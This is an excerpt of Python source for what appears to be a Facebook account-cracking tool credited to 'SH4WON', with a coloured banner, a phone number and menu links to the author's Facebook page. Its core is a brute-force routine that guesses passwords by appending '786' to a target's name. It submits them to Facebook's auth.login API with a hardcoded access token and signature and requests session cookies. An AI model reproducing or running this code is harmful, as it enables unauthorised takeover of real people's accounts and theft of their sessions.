...
\033[1;92m AUTHOR iZ : SH4WON 

\033[1;92m Wtsapp  : 01941010189

\033[1;91m-----------------------------------------------

\033[1;92m  I'M YOUR HERO: SH4WON

\033[1;92m DON'T PANGA WITH SH4WON
...
def main():
    ...
    print("\033[0;96m[ LETS START WITH SH4WON ]").center(50)
    ...
    print("\033[1;92m[2]\033[1;97mFOLLOW MY FACEBOOK")
...
def main_select():
    ...
    if Mz =="2":
        ...
        os.system("xdg-open https://www.facebook.com/Cyber.gamer.SH4WON")
...
name = q["name"]
        ...
        os.system("xdg-open https://www.facebook.com/Cyber.gamer.SH4WON1")
...
pass4=name+"786"
		                            ...
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).
